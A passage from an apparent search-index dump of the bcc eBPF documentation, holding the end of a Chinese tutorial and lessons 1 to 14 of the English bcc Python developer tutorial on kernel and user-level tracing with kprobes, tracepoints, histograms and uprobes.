\u66f4\u590d\u6742\u7684\u793a\u4f8b\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5c06\u5728\u5185\u6838\u4e2d\u6bcf\u6b21\u4efb\u52a1\u5207\u6362\u65f6\u88ab\u8c03\u7528\uff0c\u5e76\u5728\u4e00\u4e2a BPF \u6620\u5c04\u4e2d\u8bb0\u5f55\u65b0\u65e7\u8fdb\u7a0b\u7684 pid\u3002</p> <p>\u4e0b\u9762\u7684 C \u7a0b\u5e8f\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u6982\u5ff5\uff1aprev \u53c2\u6570\u3002BCC \u524d\u7aef\u4f1a\u7279\u6b8a\u5904\u7406\u8fd9\u4e2a\u53c2\u6570\uff0c\u4ece\u800c\u4f7f\u5f97\u5bf9\u8fd9\u4e2a\u53d8\u91cf\u7684\u8bbf\u95ee\u4ece\u7531 kprobe \u57fa\u7840\u8bbe\u65bd\u4f20\u9012\u7684\u4fdd\u5b58\u4e0a\u4e0b\u6587\u4e2d\u8fdb\u884c\u8bfb\u53d6\u3002\u4ece\u4f4d\u7f6e1\u5f00\u59cb\u7684\u53c2\u6570\u7684\u539f\u578b\u5e94\u8be5\u4e0e\u88ab kprobed \u7684\u5185\u6838\u51fd\u6570\u7684\u539f\u578b\u5339\u914d\u3002\u5982\u679c\u8fd9\u6837\u505a\uff0c\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u65e0\u7f1d\u8bbf\u95ee\u51fd\u6570\u53c2\u6570\u3002</p> <pre><code>#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/sched.h&gt;\n\nstruct key_t {\n    u32 prev_pid;\n    u32 curr_pid;\n};\n\nBPF_HASH(stats, struct key_t, u64, 1024);\nint count_sched(struct pt_regs *ctx, struct task_struct *prev) {\n    struct key_t key = {};\n    u64 zero = 0, *val;\n\n    key.curr_pid = bpf_get_current_pid_tgid();\n    key.prev_pid = prev-&gt;pid;\n\n    // could also use `stats.increment(key);`\n    val = stats.lookup_or_try_init(&amp;key, &amp;zero);\n    if (val) {\n      (*val)++;\n    }\n    return 0;\n}\n</code></pre> <p>\u7528\u6237\u7a7a\u95f4\u7ec4\u4ef6\u52a0\u8f7d\u4e0a\u9762\u663e\u793a\u7684\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u9644\u52a0\u5230 <code>finish_task_switch</code> \u5185\u6838\u51fd\u6570\u4e0a\u3002 BPF \u5bf9\u8c61\u7684 <code>[]</code> \u8fd0\u7b97\u7b26\u5141\u8bb8\u8bbf\u95ee\u7a0b\u5e8f\u4e2d\u7684\u6bcf\u4e2a BPF_HASH\uff0c\u5141\u8bb8\u5bf9\u5185\u6838\u4e2d\u7684\u503c\u8fdb\u884c\u901a\u884c\u8bbf\u95ee\u3002\u53ef\u4ee5\u50cf\u4f7f\u7528\u4efb\u4f55\u5176\u4ed6 python dict \u5bf9\u8c61\u4e00\u6837\u4f7f\u7528\u8be5\u5bf9\u8c61\uff1a\u8bfb\u53d6\u3001\u66f4\u65b0\u548c\u5220\u9664\u64cd\u4f5c\u90fd\u662f\u5141\u8bb8\u7684\u3002</p> <pre><code>from bcc import BPF\nfrom time import sleep\n\nb = BPF(src_file=\"task_switch.c\")\".```markdown\n```Chinese\nb.attach_kprobe(event=\"finish_task_switch\", fn_name=\"count_sched\")\n\n# \u751f\u6210\u591a\u4e2a\u8c03\u5ea6\u4e8b\u4ef6\nfor i in range(0, 100): sleep(0.01)\n\nfor k, v in b[\"stats\"].items():\n    print(\"task_switch[%5d-&gt;%5d]=%u\" % (k.prev_pid, k.curr_pid, v.value))\n</code></pre> <p>\u8fd9\u4e9b\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6587\u4ef6 examples/tracing/task_switch.c \u548c examples/tracing/task_switch.py \u4e2d\u627e\u5230\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#17","title":"\u7b2c17\u8bfe. \u8fdb\u4e00\u6b65\u7814\u7a76","text":"<p>\u8981\u8fdb\u884c\u8fdb\u4e00\u6b65\u7814\u7a76\uff0c\u8bf7\u53c2\u9605 Sasha Goldshtein \u7684 linux-tracing-workshop\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u989d\u5916\u7684\u5b9e\u9a8c\u3002bcc/tools \u4e2d\u8fd8\u6709\u8bb8\u591a\u5de5\u5177\u53ef\u4f9b\u7814\u7a76\u3002</p> <p>\u5982\u679c\u60a8\u5e0c\u671b\u4e3a bcc \u8d21\u732e\u5de5\u5177\uff0c\u8bf7\u9605\u8bfb CONTRIBUTING-SCRIPTS.md\u3002\u5728\u4e3b\u8981\u7684 README.md \u7684\u5e95\u90e8\uff0c\u60a8\u8fd8\u4f1a\u627e\u5230\u4e0e\u6211\u4eec\u8054\u7cfb\u7684\u65b9\u6cd5\u3002\u795d\u60a8\u597d\u8fd0\uff0c\u795d\u60a8\u6210\u529f\u8ffd\u8e2a\uff01</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#_2","title":"\u7f51\u7edc","text":"<p>TODO</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/","title":"bcc Python Developer Tutorial","text":"<p>This tutorial is about developing bcc tools and programs using the Python interface. There are two parts: observability then networking. Snippets are taken from various programs in bcc: see their files for licences.</p> <p>Also see the bcc developer's reference_guide.md, and a tutorial for end-users of tools: tutorial.md. There is also a lua interface for bcc.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#observability","title":"Observability","text":"<p>This observability tutorial contains 17 lessons, and 46 enumerated things to learn.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-1-hello-world","title":"Lesson 1. Hello World","text":"<p>Start by running examples/hello_world.py, while running some commands (eg, \"ls\") in another session. It should print \"Hello, World!\" for new processes. If not, start by fixing bcc: see INSTALL.md.</p> <pre><code># ./examples/hello_world.py\n            bash-13364 [002] d... 24573433.052937: : Hello, World!\n            bash-13364 [003] d... 24573436.642808: : Hello, World!\n[...]\n</code></pre> <p>Here's the code for hello_world.py:</p> <pre><code>from bcc import BPF\nBPF(text='int kprobe__sys_clone(void *ctx) { bpf_trace_printk(\"Hello, World!\\\\n\"); return 0; }').trace_print()\n</code></pre> <p>There are six things to learn from this:</p> <ol> <li> <p><code>text='...'</code>: This defines a BPF program inline. The program is written in C.</p> </li> <li> <p><code>kprobe__sys_clone()</code>: This is a short-cut for kernel dynamic tracing via kprobes. If the C function begins with <code>kprobe__</code>, the rest is treated as a kernel function name to instrument, in this case, <code>sys_clone()</code>.</p> </li> <li> <p><code>void *ctx</code>: ctx has arguments, but since we aren't using them here, we'll just cast it to <code>void *</code>.</p> </li> <li> <p><code>bpf_trace_printk()</code>: A simple kernel facility for printf() to the common trace_pipe (/sys/kernel/debug/tracing/trace_pipe). This is ok for some quick examples, but has limitations: 3 args max, 1 %s only, and trace_pipe is globally shared, so concurrent programs will have clashing output. A better interface is via BPF_PERF_OUTPUT(), covered later.</p> </li> <li> <p><code>return 0;</code>: Necessary formality (if you want to know why, see #139).</p> </li> <li> <p><code>.trace_print()</code>: A bcc routine that reads trace_pipe and prints the output.</p> </li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-2-sys_sync","title":"Lesson 2. sys_sync()","text":"<p>Write a program that traces the sys_sync() kernel function. Print \"sys_sync() called\" when it runs. Test by running <code>sync</code> in another session while tracing. The hello_world.py program has everything you need for this.</p> <p>Improve it by printing \"Tracing sys_sync()... Ctrl-C to end.\" when the program first starts. Hint: it's just Python.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-3-hello_fieldspy","title":"Lesson 3. hello_fields.py","text":"<p>This program is in examples/tracing/hello_fields.py. Sample output (run commands in another session):</p> <pre><code># examples/tracing/hello_fields.py\nTIME(s)            COMM             PID    MESSAGE\n24585001.174885999 sshd             1432   Hello, World!\n24585001.195710000 sshd             15780  Hello, World!\n24585001.991976000 systemd-udevd    484    Hello, World!\n24585002.276147000 bash             15787  Hello, World!\n</code></pre> <p>Code:</p> <pre><code>from bcc import BPF\n\n# define BPF program\nprog = \"\"\"\nint hello(void *ctx) {\n    bpf_trace_printk(\"Hello, World!\\\\n\");\n    return 0;\n}\n\"\"\"\n\n# load BPF program\nb = BPF(text=prog)\nb.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")\n\n# header\nprint(\"%-18s %-16s %-6s %s\" % (\"TIME(s)\", \"COMM\", \"PID\", \"MESSAGE\"))\n\n# format output\nwhile 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    print(\"%-18.9f %-16s %-6d %s\" % (ts, task, pid, msg))\n</code></pre> <p>This is similar to hello_world.py, and traces new processes via sys_clone() again, but has a few more things to learn:</p> <ol> <li> <p><code>prog =</code>: This time we declare the C program as a variable, and later refer to it. This is useful if you want to add some string substitutions based on command line arguments.</p> </li> <li> <p><code>hello()</code>: Now we're just declaring a C function, instead of the <code>kprobe__</code> shortcut. We'll refer to this later. All C functions declared in the BPF program are expected to be executed on a probe, hence they all need to take a <code>pt_reg* ctx</code> as first argument. If you need to define some helper function that will not be executed on a probe, they need to be defined as <code>static inline</code> in order to be inlined by the compiler. Sometimes you would also need to add <code>_always_inline</code> function attribute to it.</p> </li> <li> <p><code>b.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")</code>: Creates a kprobe for the kernel clone system call function, which will execute our defined hello() function. You can call attach_kprobe() more than once, and attach your C function to multiple kernel functions.</p> </li> <li> <p><code>b.trace_fields()</code>: Returns a fixed set of fields from trace_pipe. Similar to trace_print(), this is handy for hacking, but for real tooling we should switch to BPF_PERF_OUTPUT().</p> </li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-4-sync_timingpy","title":"Lesson 4. sync_timing.py","text":"<p>Remember the days of sysadmins typing <code>sync</code> three times on a slow console before <code>reboot</code>, to give the first asynchronous sync time to complete? Then someone thought <code>sync;sync;sync</code> was clever, to run them all on one line, which became industry practice despite defeating the original purpose! And then sync became synchronous, so more reasons it was silly. Anyway.</p> <p>The following example times how quickly the <code>do_sync</code> function is called, and prints output if it has been called more recently than one second ago. A <code>sync;sync;sync</code> will print output for the 2nd and 3rd sync's:</p> <pre><code># examples/tracing/sync_timing.py\nTracing for quick sync's... Ctrl-C to end\nAt time 0.00 s: multiple syncs detected, last 95 ms ago\nAt time 0.10 s: multiple syncs detected, last 96 ms ago\n</code></pre> <p>This program is examples/tracing/sync_timing.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\n\n# load BPF program\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nBPF_HASH(last);\n\nint do_trace(struct pt_regs *ctx) {\n    u64 ts, *tsp, delta, key = 0;\n\n    // attempt to read stored timestamp\n    tsp = last.lookup(&amp;key);\n    if (tsp != NULL) {\n        delta = bpf_ktime_get_ns() - *tsp;\n        if (delta &lt; 1000000000) {\n            // output if time is less than 1 second\n            bpf_trace_printk(\"%d\\\\n\", delta / 1000000);\n        }\n        last.delete(&amp;key);\n    }\n\n    // update stored timestamp\n    ts = bpf_ktime_get_ns();\n    last.update(&amp;key, &amp;ts);\n    return 0;\n}\n\"\"\")\n\nb.attach_kprobe(event=b.get_syscall_fnname(\"sync\"), fn_name=\"do_trace\")\nprint(\"Tracing for quick sync's... Ctrl-C to end\")\n\n# format output\nstart = 0\nwhile 1:\n    (task, pid, cpu, flags, ts, ms) = b.trace_fields()\n    if start == 0:\n        start = ts\n    ts = ts - start\n    print(\"At time %.2f s: multiple syncs detected, last %s ms ago\" % (ts, ms))\n</code></pre> <p>Things to learn:</p> <ol> <li><code>bpf_ktime_get_ns()</code>: Returns the time as nanoseconds.</li> <li><code>BPF_HASH(last)</code>: Creates a BPF map object that is a hash (associative array), called \"last\". We didn't specify any further arguments, so it defaults to key and value types of u64.</li> <li><code>key = 0</code>: We'll only store one key/value pair in this hash, where the key is hardwired to zero.</li> <li><code>last.lookup(&amp;key)</code>: Lookup the key in the hash, and return a pointer to its value if it exists, else NULL. We pass the key in as an address to a pointer.</li> <li><code>if (tsp != NULL) {</code>: The verifier requires that pointer values derived from a map lookup must be checked for a null value before they can be dereferenced and used.</li> <li><code>last.delete(&amp;key)</code>: Delete the key from the hash. This is currently required because of a kernel bug in <code>.update()</code> (fixed in 4.8.10).</li> <li><code>last.update(&amp;key, &amp;ts)</code>: Associate the value in the 2nd argument to the key, overwriting any previous value. This records the timestamp.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-5-sync_countpy","title":"Lesson 5. sync_count.py","text":"<p>Modify the sync_timing.py program (prior lesson) to store the count of all kernel sync system calls (both fast and slow), and print it with the output. This count can be recorded in the BPF program by adding a new key index to the existing hash.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-6-disksnooppy","title":"Lesson 6. disksnoop.py","text":"<p>Browse the examples/tracing/disksnoop.py program to see what is new. Here is some sample output:</p> <pre><code># disksnoop.py\nTIME(s)            T  BYTES    LAT(ms)\n16458043.436012    W  4096        3.13\n16458043.437326    W  4096        4.44\n16458044.126545    R  4096       42.82\n16458044.129872    R  4096        3.24\n[...]\n</code></pre> <p>And a code snippet:</p> <pre><code>[...]\nREQ_WRITE = 1       # from include/linux/blk_types.h\n\n# load BPF program\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/blk-mq.h&gt;\n\nBPF_HASH(start, struct request *);\n\nvoid trace_start(struct pt_regs *ctx, struct request *req) {\n    // stash start timestamp by request ptr\n    u64 ts = bpf_ktime_get_ns();\n\n    start.update(&amp;req, &amp;ts);\n}\n\nvoid trace_completion(struct pt_regs *ctx, struct request *req) {\n    u64 *tsp, delta;\n\n    tsp = start.lookup(&amp;req);\n    if (tsp != 0) {\n        delta = bpf_ktime_get_ns() - *tsp;\n        bpf_trace_printk(\"%d %x %d\\\\n\", req-&gt;__data_len,\n            req-&gt;cmd_flags, delta / 1000);\n        start.delete(&amp;req);\n    }\n}\n\"\"\")\nif BPF.get_kprobe_functions(b'blk_start_request'):\n        b.attach_kprobe(event=\"blk_start_request\", fn_name=\"trace_start\")\nb.attach_kprobe(event=\"blk_mq_start_request\", fn_name=\"trace_start\")\nif BPF.get_kprobe_functions(b'__blk_account_io_done'):\n    b.attach_kprobe(event=\"__blk_account_io_done\", fn_name=\"trace_completion\")\nelse:\n    b.attach_kprobe(event=\"blk_account_io_done\", fn_name=\"trace_completion\")\n[...]\n</code></pre> <p>Things to learn:</p> <ol> <li><code>REQ_WRITE</code>: We're defining a kernel constant in the Python program because we'll use it there later. If we were using REQ_WRITE in the BPF program, it should just work (without needing to be defined) with the appropriate #includes.</li> <li><code>trace_start(struct pt_regs *ctx, struct request *req)</code>: This function will later be attached to kprobes. The arguments to kprobe functions are <code>struct pt_regs *ctx</code>, for registers and BPF context, and then the actual arguments to the function. We'll attach this to blk_start_request(), where the first argument is <code>struct request *</code>.</li> <li><code>start.update(&amp;req, &amp;ts)</code>: We're using the pointer to the request struct as a key in our hash. What? This is commonplace in tracing. Pointers to structs turn out to be great keys, as they are unique: two structs can't have the same pointer address. (Just be careful about when it gets free'd and reused.) So what we're really doing is tagging the request struct, which describes the disk I/O, with our own timestamp, so that we can time it. There's two common keys used for storing timestamps: pointers to structs, and, thread IDs (for timing function entry to return).</li> <li><code>req-&gt;__data_len</code>: We're dereferencing members of <code>struct request</code>. See its definition in the kernel source for what members are there. bcc actually rewrites these expressions to be a series of <code>bpf_probe_read_kernel()</code> calls. Sometimes bcc can't handle a complex dereference, and you need to call <code>bpf_probe_read_kernel()</code> directly.</li> </ol> <p>This is a pretty interesting program, and if you can understand all the code, you'll understand many important basics. We're still using the bpf_trace_printk() hack, so let's fix that next.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-7-hello_perf_outputpy","title":"Lesson 7. hello_perf_output.py","text":"<p>Let's finally stop using bpf_trace_printk() and use the proper BPF_PERF_OUTPUT() interface. This will also mean we stop getting the free trace_field() members like PID and timestamp, and will need to fetch them directly. Sample output while commands are run in another session:</p> <pre><code># hello_perf_output.py\nTIME(s)            COMM             PID    MESSAGE\n0.000000000        bash             22986  Hello, perf_output!\n0.021080275        systemd-udevd    484    Hello, perf_output!\n0.021359520        systemd-udevd    484    Hello, perf_output!\n0.021590610        systemd-udevd    484    Hello, perf_output!\n[...]\n</code></pre> <p>Code is examples/tracing/hello_perf_output.py:</p> <pre><code>from bcc import BPF\n\n# define BPF program\nprog = \"\"\"\n#include &lt;linux/sched.h&gt;\n\n// define output data structure in C\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n\nint hello(struct pt_regs *ctx) {\n    struct data_t data = {};\n\n    data.pid = bpf_get_current_pid_tgid();\n    data.ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data.comm, sizeof(data.comm));\n\n    events.perf_submit(ctx, &amp;data, sizeof(data));\n\n    return 0;\n}\n\"\"\"\n\n# load BPF program\nb = BPF(text=prog)\nb.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")\n\n# header\nprint(\"%-18s %-16s %-6s %s\" % (\"TIME(s)\", \"COMM\", \"PID\", \"MESSAGE\"))\n\n# process event\nstart = 0\ndef print_event(cpu, data, size):\n    global start\n    event = b[\"events\"].event(data)\n    if start == 0:\n            start = event.ts\n    time_s = (float(event.ts - start)) / 1000000000\n    print(\"%-18.9f %-16s %-6d %s\" % (time_s, event.comm, event.pid,\n        \"Hello, perf_output!\"))\n\n# loop with callback to print_event\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    b.perf_buffer_poll()\n</code></pre> <p>Things to learn:</p> <ol> <li><code>struct data_t</code>: This defines the C struct we'll use to pass data from kernel to user space.</li> <li><code>BPF_PERF_OUTPUT(events)</code>: This names our output channel \"events\".</li> <li><code>struct data_t data = {};</code>: Create an empty data_t struct that we'll then populate.</li> <li><code>bpf_get_current_pid_tgid()</code>: Returns the process ID in the lower 32 bits (kernel's view of the PID, which in user space is usually presented as the thread ID), and the thread group ID in the upper 32 bits (what user space often thinks of as the PID). By directly setting this to a u32, we discard the upper 32 bits. Should you be presenting the PID or the TGID? For a multi-threaded app, the TGID will be the same, so you need the PID to differentiate them, if that's what you want. It's also a question of expectations for the end user.</li> <li><code>bpf_get_current_comm()</code>: Populates the first argument address with the current process name.</li> <li><code>events.perf_submit()</code>: Submit the event for user space to read via a perf ring buffer.</li> <li><code>def print_event()</code>: Define a Python function that will handle reading events from the <code>events</code> stream.</li> <li><code>b[\"events\"].event(data)</code>: Now get the event as a Python object, auto-generated from the C declaration.</li> <li><code>b[\"events\"].open_perf_buffer(print_event)</code>: Associate the Python <code>print_event</code> function with the <code>events</code> stream.</li> <li><code>while 1: b.perf_buffer_poll()</code>: Block waiting for events.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-8-sync_perf_outputpy","title":"Lesson 8. sync_perf_output.py","text":"<p>Rewrite sync_timing.py, from a prior lesson, to use <code>BPF_PERF_OUTPUT</code>.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-9-bitehistpy","title":"Lesson 9. bitehist.py","text":"<p>The following tool records a histogram of disk I/O sizes. Sample output:</p> <pre><code># bitehist.py\nTracing... Hit Ctrl-C to end.\n^C\n     kbytes          : count     distribution\n       0 -&gt; 1        : 3        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 211      |**********                            |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\n      32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 800      |**************************************|\n</code></pre> <p>Code is examples/tracing/bitehist.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\nfrom time import sleep\n\n# load BPF program\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/blkdev.h&gt;\n\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n    dist.increment(bpf_log2l(req-&gt;__data_len / 1024));\n    return 0;\n}\n\"\"\")\n\n# header\nprint(\"Tracing... Hit Ctrl-C to end.\")\n\n# trace until Ctrl-C\ntry:\n    sleep(99999999)\nexcept KeyboardInterrupt:\n    print()\n\n# output\nb[\"dist\"].print_log2_hist(\"kbytes\")\n</code></pre> <p>A recap from earlier lessons:</p> <ul> <li><code>kprobe__</code>: This prefix means the rest will be treated as a kernel function name that will be instrumented using kprobe.</li> <li><code>struct pt_regs *ctx, struct request *req</code>: Arguments to kprobe. The <code>ctx</code> is registers and BPF context, the <code>req</code> is the first argument to the instrumented function: <code>blk_account_io_done()</code>.</li> <li><code>req-&gt;__data_len</code>: Dereferencing that member.</li> </ul> <p>New things to learn:</p> <ol> <li><code>BPF_HISTOGRAM(dist)</code>: Defines a BPF map object that is a histogram, and names it \"dist\".</li> <li><code>dist.increment()</code>: Increments the histogram bucket index provided as first argument by one by default. Optionally, custom increments can be passed as the second argument.</li> <li><code>bpf_log2l()</code>: Returns the log-2 of the provided value. This becomes the index of our histogram, so that we're constructing a power-of-2 histogram.</li> <li><code>b[\"dist\"].print_log2_hist(\"kbytes\")</code>: Prints the \"dist\" histogram as power-of-2, with a column header of \"kbytes\". The only data transferred from kernel to user space is the bucket counts, making this efficient.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-10-disklatencypy","title":"Lesson 10. disklatency.py","text":"<p>Write a program that times disk I/O, and prints a histogram of their latency. Disk I/O instrumentation and timing can be found in the disksnoop.py program from a prior lesson, and histogram code can be found in bitehist.py from a prior lesson.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-11-vfsreadlatpy","title":"Lesson 11. vfsreadlat.py","text":"<p>This example is split into separate Python and C files. Example output:</p> <pre><code># vfsreadlat.py 1\nTracing... Hit Ctrl-C to end.\n     usecs               : count     distribution\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 2        |***********                             |\n         4 -&gt; 7          : 7        |****************************************|\n         8 -&gt; 15         : 4        |**********************                  |\n\n     usecs               : count     distribution\n         0 -&gt; 1          : 29       |****************************************|\n         2 -&gt; 3          : 28       |**************************************  |\n         4 -&gt; 7          : 4        |*****                                   |\n         8 -&gt; 15         : 8        |***********                             |\n        16 -&gt; 31         : 0        |                                        |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 0        |                                        |\n       128 -&gt; 255        : 0        |                                        |\n       256 -&gt; 511        : 2        |**                                      |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 0        |                                        |\n      4096 -&gt; 8191       : 4        |*****                                   |\n      8192 -&gt; 16383      : 6        |********                                |\n     16384 -&gt; 32767      : 9        |************                            |\n     32768 -&gt; 65535      : 6        |********                                |\n     65536 -&gt; 131071     : 2        |**                                      |\n\n     usecs               : count     distribution\n         0 -&gt; 1          : 11       |****************************************|\n         2 -&gt; 3          : 2        |*******                                 |\n         4 -&gt; 7          : 10       |************************************    |\n         8 -&gt; 15         : 8        |*****************************           |\n        16 -&gt; 31         : 1        |***                                     |\n        32 -&gt; 63         : 2        |*******                                 |\n[...]\n</code></pre> <p>Browse the code in examples/tracing/vfsreadlat.py and examples/tracing/vfsreadlat.c. Things to learn:</p> <ol> <li><code>b = BPF(src_file = \"vfsreadlat.c\")</code>: Read the BPF C program from a separate source file.</li> <li><code>b.attach_kretprobe(event=\"vfs_read\", fn_name=\"do_return\")</code>: Attaches the BPF C function <code>do_return()</code> to the return of the kernel function <code>vfs_read()</code>. This is a kretprobe: instrumenting the return from a function, rather than its entry.</li> <li><code>b[\"dist\"].clear()</code>: Clears the histogram.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-12-urandomreadpy","title":"Lesson 12. urandomread.py","text":"<p>Tracing while a <code>dd if=/dev/urandom of=/dev/null bs=8k count=5</code> is run:</p> <pre><code># urandomread.py\nTIME(s)            COMM             PID    GOTBITS\n24652832.956994001 smtp             24690  384\n24652837.726500999 dd               24692  65536\n24652837.727111001 dd               24692  65536\n24652837.727703001 dd               24692  65536\n24652837.728294998 dd               24692  65536\n24652837.728888001 dd               24692  65536\n</code></pre> <p>Hah! I caught smtp by accident. Code is examples/tracing/urandomread.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\n\n# load BPF program\nb = BPF(text=\"\"\"\nTRACEPOINT_PROBE(random, urandom_read) {\n    // args is from /sys/kernel/debug/tracing/events/random/urandom_read/format\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n}\n\"\"\")\n\n# header\nprint(\"%-18s %-16s %-6s %s\" % (\"TIME(s)\", \"COMM\", \"PID\", \"GOTBITS\"))\n\n# format output\nwhile 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    print(\"%-18.9f %-16s %-6d %s\" % (ts, task, pid, msg))\n</code></pre> <p>Things to learn:</p> <ol> <li><code>TRACEPOINT_PROBE(random, urandom_read)</code>: Instrument the kernel tracepoint <code>random:urandom_read</code>. These have a stable API, and thus are recommend to use instead of kprobes, wherever possible. You can run <code>perf list</code> for a list of tracepoints. Linux &gt;= 4.7 is required to attach BPF programs to tracepoints.</li> <li><code>args-&gt;got_bits</code>: <code>args</code> is auto-populated to be a structure of the tracepoint arguments. The comment above says where you can see that structure. Eg:</li> </ol> <pre><code># cat /sys/kernel/debug/tracing/events/random/urandom_read/format\nname: urandom_read\nID: 972\nformat:\n    field:unsigned short common_type;   offset:0;   size:2; signed:0;\n    field:unsigned char common_flags;   offset:2;   size:1; signed:0;\n    field:unsigned char common_preempt_count;   offset:3;   size:1; signed:0;\n    field:int common_pid;   offset:4;   size:4; signed:1;\n\n    field:int got_bits; offset:8;   size:4; signed:1;\n    field:int pool_left;    offset:12;  size:4; signed:1;\n    field:int input_left;   offset:16;  size:4; signed:1;\n\nprint fmt: \"got_bits %d nonblocking_pool_entropy_left %d input_entropy_left %d\", REC-&gt;got_bits, REC-&gt;pool_left, REC-&gt;input_left\n</code></pre> <p>In this case, we were printing the <code>got_bits</code> member.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-13-disksnooppy-fixed","title":"Lesson 13. disksnoop.py fixed","text":"<p>Convert disksnoop.py from a previous lesson to use the <code>block:block_rq_issue</code> and <code>block:block_rq_complete</code> tracepoints.</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-14-strlen_countpy","title":"Lesson 14. strlen_count.py","text":"<p>This program instruments a user-level function, the <code>strlen()</code> library function, and frequency counts its string argument. Example output:</p> <pre><code># strlen_count.py\nTracing strlen()... Hit Ctrl-C to end.\n^C     COUNT STRING\n         1 \" \"\n         1 \"/bin/ls\"\n         1 \".\"\n         1 \"cpudist.py.1\"\n         1 \".bashrc\"\n         1 \"ls --color=auto\"\n         1 \"key_t\"\n[...]\n        10 \"a7:~# \"\n        10 \"/root\"\n        12 \"LC_ALL\"\n        12 \"en_US.UTF-8\"\n        13 \"en_US.UTF-8\"\n        20 \"~\"\n        70 \"#%^,~:-=?+/}\"\n       340 \"\\x01\\x1b]0;root@bgregg-test: ~\\x07\\x02root@bgregg-test:~# \"\n</code></pre> <p>These are various strings that are being processed by this library function while tracing, along with their frequency counts. <code>strlen()</code> was called on \"LC_ALL\" 12 times, for example.</p> <p>Code is examples/tracing/strlen_count.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\nfrom time import sleep\n\n# load BPF program\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nstruct key_t {\n    char c[80];\n};\nBPF_HASH(counts, struct key_t);\n\nint count(struct pt_regs *ctx) {\n    if (!PT_REGS_PARM1(ctx))\n        return 0;\n\n    struct key_t key = {};\n    u64 zero = 0, *val;\n\n    bpf_probe_read_user(&amp;key.c, sizeof(key.c), (void *)PT_REGS_PARM1(ctx));\n    // could also use `counts.increment(key)`\n    val = counts.lookup_or_try_init(&amp;key, &amp;zero);\n    if (val) {\n      (*val)++;\n    }\n    return 0;\n};\n\"\"\")\nb.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n\n# header\nprint(\"Tracing strlen()... Hit Ctrl-C to end.\")\n\n# sleep until Ctrl-C\ntry:\n    sleep(99999999)\nexcept KeyboardInterrupt:\n    pass\n\n# print output\nprint(\"%10s %s\" % (\"COUNT\", \"STRING\"))\ncounts = b.get_table(\"counts\")\nfor k, v in sorted(counts.items(), key=lambda counts: counts[1].value):\n    print(\"%10d \\\"%s\\\"\" % (v.value, k.c.encode('string-escape')))\n</code></pre> <p>Things to learn:</p> <ol> <li><code>PT_REGS_PARM1(ctx)</code>: This fetches the first argument to <code>strlen()</code>, which is the string.</li> <li><code>b.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")</code>: Attach to library \"c\" (if this is the main program, use its pathname), instrument the user-level function <code>strlen()</code>, and on execution call our C function <code>count()</code>.</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer_en/#lesson-15-nodejs_http_serverpy","title":"Lesson 15. 